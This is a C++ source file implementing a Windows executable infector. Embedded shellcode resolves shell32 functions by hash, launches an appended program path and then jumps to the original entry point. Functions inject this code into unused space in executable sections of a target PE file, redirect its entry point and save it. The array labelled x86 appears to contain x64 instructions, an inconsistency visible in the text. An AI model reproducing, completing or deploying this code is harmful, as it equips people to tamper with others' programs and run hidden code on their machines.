#include "autorun.h"
#include "error.h"
#include <peconv.h>

BYTE shellcode_x64[416] = {
    0x48, 0xB8, 0x53, 0x68, 0x65, 0x6C, 0x6C, 0x33, 0x32, 0x2E, 0x53, 0x48,
    0x83, 0xEC, 0x50, 0x48, 0x89, 0x44, 0x24, 0x44, 0xC7, 0x44, 0x24, 0x4C,
    0x64, 0x6C, 0x6C, 0x00, 0xC7, 0x44, 0x24, 0x3F, 0x6F, 0x70, 0x65, 0x6E,
    0xC6, 0x44, 0x24, 0x43, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00,
    0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x58, 0x10, 0x48, 0x8B,
    0x43, 0x30, 0x48, 0x63, 0x50, 0x3C, 0x8B, 0x94, 0x10, 0x88, 0x00, 0x00,
    0x00, 0x48, 0x01, 0xC2, 0x48, 0x39, 0xD0, 0x74, 0x7F, 0x8B, 0x4A, 0x18,
    0x44, 0x8D, 0x41, 0xFF, 0x41, 0x83, 0xF8, 0xFF, 0x74, 0x72, 0x44, 0x8B,
    0x4A, 0x20, 0x44, 0x89, 0xC1, 0x4C, 0x8D, 0x14, 0x88, 0x47, 0x8B, 0x14,
    0x0A, 0x41, 0xB9, 0x02, 0x69, 0x5C, 0x45, 0x49, 0x01, 0xC2, 0x45, 0x0F,
    0xBE, 0x1A, 0x45, 0x84, 0xDB, 0x75, 0x42, 0x41, 0xFF, 0xC8, 0x41, 0x81,
    0xF9, 0x74, 0x2B, 0x00, 0xF4, 0x75, 0xCD, 0x44, 0x8B, 0x4A, 0x24, 0x48,
    0x01, 0xC9, 0x48, 0x01, 0xC1, 0x8B, 0x52, 0x1C, 0x42, 0x0F, 0xB7, 0x0C,
    0x09, 0x48, 0x8D, 0x0C, 0x88, 0x8B, 0x14, 0x11, 0x48, 0x8D, 0x4C, 0x24,
    0x44, 0x48, 0x01, 0xD0, 0xFF, 0xD0, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60,
    0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x58, 0x10, 0xEB,
    0x1A, 0x45, 0x31, 0xD9, 0x49, 0xFF, 0xC2, 0x45, 0x69, 0xC9, 0x93, 0x01,
    0x00, 0x01, 0xEB, 0xA6, 0x48, 0x8B, 0x1B, 0xE9, 0x62, 0xFF, 0xFF, 0xFF,
    0x48, 0x8B, 0x1B, 0x48, 0x8B, 0x43, 0x30, 0x48, 0x63, 0x50, 0x3C, 0x8B,
    0x94, 0x10, 0x88, 0x00, 0x00, 0x00, 0x48, 0x01, 0xC2, 0x48, 0x39, 0xD0,
    0x74, 0xE6, 0x8B, 0x4A, 0x18, 0x44, 0x8D, 0x41, 0xFF, 0x41, 0x83, 0xF8,
    0xFF, 0x74, 0xD9, 0x44, 0x8B, 0x4A, 0x20, 0x44, 0x89, 0xC1, 0x4C, 0x8D,
    0x14, 0x88, 0x47, 0x8B, 0x14, 0x0A, 0x41, 0xB9, 0x78, 0xAF, 0x5E, 0x4A,
    0x49, 0x01, 0xC2, 0x45, 0x0F, 0xBE, 0x1A, 0x45, 0x84, 0xDB, 0x75, 0x6A,
    0x41, 0xFF, 0xC8, 0x41, 0x81, 0xF9, 0xB8, 0xF5, 0x79, 0xDD, 0x75, 0xCD,
    0x44, 0x8B, 0x42, 0x24, 0x48, 0x01, 0xC9, 0x45, 0x31, 0xC9, 0x48, 0x01,
    0xC1, 0x8B, 0x52, 0x1C, 0x42, 0x0F, 0xB7, 0x0C, 0x01, 0x4C, 0x8D, 0x05,
    0x58, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0C, 0x88, 0x8B, 0x14, 0x11, 0x31,
    0xC9, 0x48, 0x89, 0x4C, 0x24, 0x20, 0x31, 0xC9, 0x48, 0x01, 0xD0, 0x31,
    0xD2, 0x89, 0x54, 0x24, 0x28, 0x48, 0x8D, 0x54, 0x24, 0x3F, 0xFF, 0xD0,
    0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40,
    0x18, 0x48, 0x8B, 0x50, 0x10, 0xB8, 0xEF, 0xBE, 0xAD, 0xDE, 0x48, 0x03,
    0x42, 0x30, 0xFF, 0xD0, 0x48, 0x83, 0xC4, 0x50, 0x5B, 0xC3, 0x45, 0x31,
    0xD9, 0x49, 0xFF, 0xC2, 0x45, 0x69, 0xC9, 0x93, 0x01, 0x00, 0x01, 0xE9,
    0x7B, 0xFF, 0xFF, 0xFF, 0x90, 0x90, 0x90, 0x90};

BYTE shellcode_x86[416] = {
    0x48, 0xB8, 0x53, 0x68, 0x65, 0x6C, 0x6C, 0x33, 0x32, 0x2E, 0x53, 0x48,
    0x83, 0xEC, 0x50, 0x48, 0x89, 0x44, 0x24, 0x44, 0xC7, 0x44, 0x24, 0x4C,
    0x64, 0x6C, 0x6C, 0x00, 0xC7, 0x44, 0x24, 0x3F, 0x6F, 0x70, 0x65, 0x6E,
    0xC6, 0x44, 0x24, 0x43, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00,
    0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x58, 0x10, 0x48, 0x8B,
    0x43, 0x30, 0x48, 0x63, 0x50, 0x3C, 0x8B, 0x94, 0x10, 0x88, 0x00, 0x00,
    0x00, 0x48, 0x01, 0xC2, 0x48, 0x39, 0xD0, 0x74, 0x7F, 0x8B, 0x4A, 0x18,
    0x44, 0x8D, 0x41, 0xFF, 0x41, 0x83, 0xF8, 0xFF, 0x74, 0x72, 0x44, 0x8B,
    0x4A, 0x20, 0x44, 0x89, 0xC1, 0x4C, 0x8D, 0x14, 0x88, 0x47, 0x8B, 0x14,
    0x0A, 0x41, 0xB9, 0x20, 0xE1, 0xB1, 0x81, 0x49, 0x01, 0xC2, 0x45, 0x0F,
    0xBE, 0x1A, 0x45, 0x84, 0xDB, 0x75, 0x42, 0x41, 0xFF, 0xC8, 0x41, 0x81,
    0xF9, 0x72, 0x6B, 0xA1, 0xCC, 0x75, 0xCD, 0x44, 0x8B, 0x4A, 0x24, 0x48,
    0x01, 0xC9, 0x48, 0x01, 0xC1, 0x8B, 0x52, 0x1C, 0x42, 0x0F, 0xB7, 0x0C,
    0x09, 0x48, 0x8D, 0x0C, 0x88, 0x8B, 0x14, 0x11, 0x48, 0x8D, 0x4C, 0x24,
    0x44, 0x48, 0x01, 0xD0, 0xFF, 0xD0, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60,
    0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x58, 0x10, 0xEB,
    0x1A, 0x45, 0x31, 0xD9, 0x49, 0xFF, 0xC2, 0x45, 0x69, 0xC9, 0x93, 0x01,
    0x00, 0x01, 0xEB, 0xA6, 0x48, 0x8B, 0x1B, 0xE9, 0x62, 0xFF, 0xFF, 0xFF,
    0x48, 0x8B, 0x1B, 0x48, 0x8B, 0x43, 0x30, 0x48, 0x63, 0x50, 0x3C, 0x8B,
    0x94, 0x10, 0x88, 0x00, 0x00, 0x00, 0x48, 0x01, 0xC2, 0x48, 0x39, 0xD0,
    0x74, 0xE6, 0x8B, 0x4A, 0x18, 0x44, 0x8D, 0x41, 0xFF, 0x41, 0x83, 0xF8,
    0xFF, 0x74, 0xD9, 0x44, 0x8B, 0x4A, 0x20, 0x44, 0x89, 0xC1, 0x4C, 0x8D,
    0x14, 0x88, 0x47, 0x8B, 0x14, 0x0A, 0x41, 0xB9, 0x96, 0x27, 0xB4, 0x86,
    0x49, 0x01, 0xC2, 0x45, 0x0F, 0xBE, 0x1A, 0x45, 0x84, 0xDB, 0x75, 0x6A,
    0x41, 0xFF, 0xC8, 0x41, 0x81, 0xF9, 0xA2, 0x0A, 0xB0, 0x18, 0x75, 0xCD,
    0x44, 0x8B, 0x42, 0x24, 0x48, 0x01, 0xC9, 0x45, 0x31, 0xC9, 0x48, 0x01,
    0xC1, 0x8B, 0x52, 0x1C, 0x42, 0x0F, 0xB7, 0x0C, 0x01, 0x4C, 0x8D, 0x05,
    0x58, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0C, 0x88, 0x8B, 0x14, 0x11, 0x31,
    0xC9, 0x48, 0x89, 0x4C, 0x24, 0x20, 0x31, 0xC9, 0x48, 0x01, 0xD0, 0x31,
    0xD2, 0x89, 0x54, 0x24, 0x28, 0x48, 0x8D, 0x54, 0x24, 0x3F, 0xFF, 0xD0,
    0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40,
    0x18, 0x48, 0x8B, 0x50, 0x10, 0xB8, 0xEF, 0xBE, 0xAD, 0xDE, 0x48, 0x03,
    0x42, 0x30, 0xFF, 0xD0, 0x48, 0x83, 0xC4, 0x50, 0x5B, 0xC3, 0x45, 0x31,
    0xD9, 0x49, 0xFF, 0xC2, 0x45, 0x69, 0xC9, 0x93, 0x01, 0x00, 0x01, 0xE9,
    0x7B, 0xFF, 0xFF, 0xFF, 0x90, 0x90, 0x90, 0x90};

bool infected(BYTE *buffer, size_t buf_size, const BYTE *shellcode) {
  auto oep_rva = peconv::get_entry_point_rva(buffer);
  auto sec_num = peconv::get_sections_count(buffer, buf_size);
  const auto needle_size = 50;

  for (size_t i = 0; i < sec_num; i++) {
    auto hdr = peconv::get_section_hdr(buffer, buf_size, i);

    if (hdr->VirtualAddress <= oep_rva &&
        oep_rva < hdr->VirtualAddress + hdr->SizeOfRawData) {
      auto delta = oep_rva - hdr->VirtualAddress;
      auto remaining = hdr->SizeOfRawData - delta;
      auto oep_foa = hdr->PointerToRawData + delta;
      auto begin = (uint8_t *)buffer + oep_foa;

      for (auto h = (const uint8_t *)begin; remaining >= needle_size;
           ++h, --remaining) {
        if (!memcmp(h, shellcode, needle_size)) {
          return true;
        }
      }
    }
  }

  return false;
}

void prepare_shellcode(BYTE *shellcode, size_t size, uint32_t oep_rva) {
  const uint8_t needle[] = {0xEF, 0xBE, 0xAD, 0xDE};

  for (auto h = (BYTE *)shellcode; size >= sizeof(needle); ++h, --size) {
    if (!memcmp(h, needle, sizeof(needle))) {
      *(uint32_t *)h = oep_rva;
    }
  }
}

bool infect_at(rust::String target, rust::String exe) {
  auto modified = false;
  size_t buf_size = 0;
  auto buffer = peconv::load_file(target.c_str(), buf_size);
  size_t shellcode_size = 0;
  BYTE *shellcode = nullptr;

  if (buffer == nullptr) {
    throw AppError("failed to load the target file");
  }

  // It seems that the infection check is not needed here, as we are overwriting
  // previous infection.
  // if (infected(buffer, buf_size) == true) {
  //   peconv::free_file(buffer);
  //   return false;
  // }

  auto oep_rva = peconv::get_entry_point_rva(buffer);
  auto sec_num = peconv::get_sections_count(buffer, buf_size);
  auto machine = peconv::get_file_hdr(buffer, buf_size)->Machine;

  if (machine == IMAGE_FILE_MACHINE_AMD64) {
    shellcode = shellcode_x64;
    shellcode_size = sizeof(shellcode_x64);
  } else if (machine == IMAGE_FILE_MACHINE_I386) {
    shellcode = shellcode_x86;
    shellcode_size = sizeof(shellcode_x86);
  } else {
    peconv::free_file(buffer);
    throw AppError("unsupported machine type");
  }

  prepare_shellcode(shellcode, shellcode_size, oep_rva);

  for (size_t i = 0; i < sec_num; i++) {
    auto hdr = peconv::get_section_hdr(buffer, buf_size, i);
    auto remaining =
        (int64_t)hdr->SizeOfRawData - (int64_t)hdr->Misc.VirtualSize;
    if (remaining > shellcode_size + exe.size() &&
        hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
      auto begin =
          (uint8_t *)buffer + hdr->PointerToRawData + hdr->Misc.VirtualSize;

      memcpy(begin, shellcode, shellcode_size);
      memcpy(begin + shellcode_size, exe.c_str(), exe.size());

      peconv::update_entry_point_rva(buffer, hdr->VirtualAddress +
                                                 hdr->Misc.VirtualSize);
      modified = true;
    }
  }

  if (modified == true) {
    peconv::dump_to_file(target.c_str(), buffer, buf_size);
  }
  peconv::free_file(buffer);
  return modified;
}

bool infectious_at(rust::String target, rust::String exe) {
  size_t buf_size = 0;
  auto buffer = peconv::load_file(target.c_str(), buf_size);
  size_t shellcode_size = 0;

  if (buffer == nullptr) {
    throw AppError("failed to load the target file");
  }

  auto sec_num = peconv::get_sections_count(buffer, buf_size);
  auto machine = peconv::get_file_hdr(buffer, buf_size)->Machine;

  if (machine == IMAGE_FILE_MACHINE_AMD64) {
    shellcode_size = sizeof(shellcode_x64);
  } else if (machine == IMAGE_FILE_MACHINE_I386) {
    shellcode_size = sizeof(shellcode_x86);
  } else {
    peconv::free_file(buffer);
    throw AppError("unsupported machine type");
  }

  for (size_t i = 0; i < sec_num; i++) {
    auto hdr = peconv::get_section_hdr(buffer, buf_size, i);
    auto remaining =
        (int64_t)hdr->SizeOfRawData - (int64_t)hdr->Misc.VirtualSize;
    if (remaining > shellcode_size + exe.size() &&
        hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
      return true;
    }
  }

  return false;
}
